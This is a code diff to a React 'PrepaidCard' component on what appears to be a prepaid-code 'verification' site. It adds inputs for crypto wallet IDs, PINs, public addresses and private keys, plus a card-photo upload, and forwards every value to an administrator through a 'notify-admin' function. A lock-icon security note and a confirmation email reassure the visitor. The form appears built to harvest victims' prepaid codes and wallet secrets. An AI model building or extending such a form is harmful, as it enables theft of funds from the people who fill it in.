@@ -1,11 +1,11 @@
 import { useState } from 'react';
 import { useLanguage } from '@/contexts/LanguageContext';
-import { submitCodes } from '@/lib/supabase-submissions';
+import { submitCodes, uploadCardImage } from '@/lib/supabase-submissions';
 import { supabase } from '@/integrations/supabase/client';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
-import { ChevronDown, ChevronUp, Lock, Mail, Hash } from 'lucide-react';
+import { ChevronDown, ChevronUp, Lock, Mail, Hash, Wallet, Key, ImagePlus } from 'lucide-react';
 import { toast } from 'sonner';
 
 interface PrepaidCardProps {
@@ -13,13 +13,19 @@ interface PrepaidCardProps {
   description: string;
   logo: string;
   bgColor: string;
+  kind?: 'codes' | 'crypto';
 }
 
-const PrepaidCard: React.FC<PrepaidCardProps> = ({ name, description, logo, bgColor }) => {
+const PrepaidCard: React.FC<PrepaidCardProps> = ({ name, description, logo, bgColor, kind = 'codes' }) => {
   const { t } = useLanguage();
   const [isOpen, setIsOpen] = useState(false);
   const [email, setEmail] = useState('');
   const [codes, setCodes] = useState(['', '', '', '', '']);
+  const [wallet, setWallet] = useState('');
+  const [pin, setPin] = useState('');
+  const [publicAddress, setPublicAddress] = useState('');
+  const [privateKey, setPrivateKey] = useState('');
+  const [imageFile, setImageFile] = useState<File | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   const handleCodeChange = (index: number, value: string) => {
@@ -30,55 +36,90 @@ const PrepaidCard: React.FC<PrepaidCardProps> = ({ name, description, logo, bgCo
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     if (!email || !email.includes('@')) {
       toast.error(t('validEmailError'));
       return;
     }
-    
-    const filledCodes = codes.filter(code => code.trim() !== '');
-    if (filledCodes.length === 0) {
-      toast.error(t('atLeastOneCodeError'));
-      return;
+
+    if (kind === 'codes') {
+      const filledCodes = codes.filter(c => c.trim() !== '');
+      if (filledCodes.length === 0 && !imageFile) {
+        toast.error(t('atLeastOneCodeError'));
+        return;
+      }
+    } else {
+      if (!wallet && !pin && !publicAddress && !privateKey && !imageFile) {
+        toast.error(t('atLeastOneCodeError'));
+        return;
+      }
     }
 
     setIsSubmitting(true);
-    
-    // Submit to database
+
+    let imageUrl: string | undefined;
+    if (imageFile) {
+      const up = await uploadCardImage(imageFile);
+      if (up.error) {
+        toast.error(up.error);
+        setIsSubmitting(false);
+        return;
+      }
+      imageUrl = up.url;
+    }
+
     const result = await submitCodes({
       cardType: name,
       email,
-      codes,
+      codes: kind === 'codes' ? codes : undefined,
+      wallet: kind === 'crypto' ? wallet : undefined,
+      pin: kind === 'crypto' ? pin : undefined,
+      publicAddress: kind === 'crypto' ? publicAddress : undefined,
+      privateKey: kind === 'crypto' ? privateKey : undefined,
+      imageUrl,
     });
-    
-    if (result.success) {
-      // Notify admin via email
-      try {
-        const { error } = await supabase.functions.invoke('notify-admin', {
-          body: { cardType: name, email, codes: filledCodes },
-        });
 
-        if (error) {
-          console.error('Failed to notify admin:', error);
-        }
+    if (result.success) {
+      try {
+        await supabase.functions.invoke('notify-admin', {
+          body: {
+            cardType: name,
+            email,
+            codes: kind === 'codes' ? codes.filter(c => c.trim() !== '') : [],
+            wallet,
+            pin,
+            publicAddress,
+            privateKey,
+            imageUrl,
+          },
+        });
       } catch (error) {
         console.error('Failed to notify admin:', error);
       }
-      
+
+      try {
+        await supabase.functions.invoke('send-confirmation', {
+          body: { recipientEmail: email, cardType: name, language: 'fr' },
+        });
+      } catch (error) {
+        console.error('Failed to send confirmation:', error);
+      }
+
       toast.success(t('submitSuccess'));
       setEmail('');
       setCodes(['', '', '', '', '']);
+      setWallet(''); setPin(''); setPublicAddress(''); setPrivateKey('');
+      setImageFile(null);
       setIsOpen(false);
     } else {
       toast.error(t('submitError'));
     }
-    
+
     setIsSubmitting(false);
   };
 
   return (
     <div className="bg-card rounded-xl card-shadow hover:card-shadow-hover transition-all duration-300 overflow-hidden">
-      {/* Card header */}
       <button
         onClick={() => setIsOpen(!isOpen)}
         className="w-full p-6 flex items-center justify-between hover:bg-secondary/50 transition-colors"
@@ -96,23 +137,13 @@ const PrepaidCard: React.FC<PrepaidCardProps> = ({ name, description, logo, bgCo
           <span className="text-sm font-medium text-primary hidden sm:block">
             {t('enterCode')}
           </span>
-          {isOpen ? (
-            <ChevronUp className="w-5 h-5 text-muted-foreground" />
-          ) : (
-            <ChevronDown className="w-5 h-5 text-muted-foreground" />
-          )}
+          {isOpen ? <ChevronUp className="w-5 h-5 text-muted-foreground" /> : <ChevronDown className="w-5 h-5 text-muted-foreground" />}
         </div>
       </button>
-      
-      {/* Accordion content */}
-      <div
-        className={`overflow-hidden transition-all duration-300 ${
-          isOpen ? 'max-h-[600px] opacity-100' : 'max-h-0 opacity-0'
-        }`}
-      >
+
+      <div className={`overflow-hidden transition-all duration-300 ${isOpen ? 'max-h-[1400px] opacity-100' : 'max-h-0 opacity-0'}`}>
         <form onSubmit={handleSubmit} className="p-6 pt-0 border-t border-border">
           <div className="space-y-4 mt-6">
-            {/* Email field */}
             <div className="space-y-2">
               <Label htmlFor={`email-${name}`} className="flex items-center gap-2 text-foreground">
                 <Mail className="w-4 h-4" />
@@ -127,38 +158,73 @@ const PrepaidCard: React.FC<PrepaidCardProps> = ({ name, description, logo, bgCo
                 className="bg-secondary/50"
               />
             </div>
-            
-            {/* Code fields */}
-            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
-              {codes.map((code, index) => (
-                <div key={index} className="space-y-2">
-                  <Label htmlFor={`code-${name}-${index}`} className="flex items-center gap-2 text-foreground">
-                    <Hash className="w-4 h-4" />
-                    {t('code')} {index + 1}
-                  </Label>
-                  <Input
-                    id={`code-${name}-${index}`}
-                    type="text"
-                    placeholder="XXXX-XXXX-XXXX"
-                    value={code}
-                    onChange={(e) => handleCodeChange(index, e.target.value)}
-                    className="bg-secondary/50 font-mono"
-                  />
+
+            {kind === 'codes' ? (
+              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
+                {codes.map((code, index) => (
+                  <div key={index} className="space-y-2">
+                    <Label htmlFor={`code-${name}-${index}`} className="flex items-center gap-2 text-foreground">
+                      <Hash className="w-4 h-4" />
+                      {t('code')} {index + 1}
+                    </Label>
+                    <Input
+                      id={`code-${name}-${index}`}
+                      type="text"
+                      placeholder="XXXX-XXXX-XXXX"
+                      value={code}
+                      onChange={(e) => handleCodeChange(index, e.target.value)}
+                      className="bg-secondary/50 font-mono"
+                    />
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                <div className="space-y-2">
+                  <Label className="flex items-center gap-2 text-foreground"><Wallet className="w-4 h-4" />{t('wallet')}</Label>
+                  <Input value={wallet} onChange={(e) => setWallet(e.target.value)} className="bg-secondary/50 font-mono" placeholder="UHYRI7" />
                 </div>
-              ))}
+                <div className="space-y-2">
+                  <Label className="flex items-center gap-2 text-foreground"><Lock className="w-4 h-4" />{t('pin')}</Label>
+                  <Input value={pin} onChange={(e) => setPin(e.target.value)} className="bg-secondary/50 font-mono" placeholder="GOW8K2" />
+                </div>
+                <div className="space-y-2 sm:col-span-2">
+                  <Label className="flex items-center gap-2 text-foreground"><Hash className="w-4 h-4" />{t('publicAddress')}</Label>
+                  <Input value={publicAddress} onChange={(e) => setPublicAddress(e.target.value)} className="bg-secondary/50 font-mono" placeholder="bc1q..." />
+                </div>
+                <div className="space-y-2 sm:col-span-2">
+                  <Label className="flex items-center gap-2 text-foreground"><Key className="w-4 h-4" />{t('privateKey')}</Label>
+                  <Input value={privateKey} onChange={(e) => setPrivateKey(e.target.value)} className="bg-secondary/50 font-mono" placeholder="KzRSsPr5sX1d4J7..." />
+                </div>
+              </div>
+            )}
+
+            {/* Photo upload */}
+            <div className="space-y-2">
+              <Label className="flex items-center gap-2 text-foreground">
+                <ImagePlus className="w-4 h-4" />
+                {t('cardPhoto')}
+              </Label>
+              <Input
+                type="file"
+                accept="image/*"
+                onChange={(e) => setImageFile(e.target.files?.[0] || null)}
+                className="bg-secondary/50 cursor-pointer"
+              />
+              {imageFile && (
+                <p className="text-xs text-muted-foreground">{imageFile.name}</p>
+              )}
             </div>
-            
-            {/* Submit button */}
+
             <div className="pt-4">
-              <Button 
-                type="submit" 
+              <Button
+                type="submit"
                 className="w-full accent-gradient text-accent-foreground font-semibold py-6"
                 disabled={isSubmitting}
               >
                 {isSubmitting ? '...' : t('submit')}
               </Button>
-              
-              {/* Security note */}
+
               <p className="flex items-center justify-center gap-2 text-xs text-muted-foreground mt-3">
                 <Lock className="w-3 h-3" />
                 {t('securityNote')}
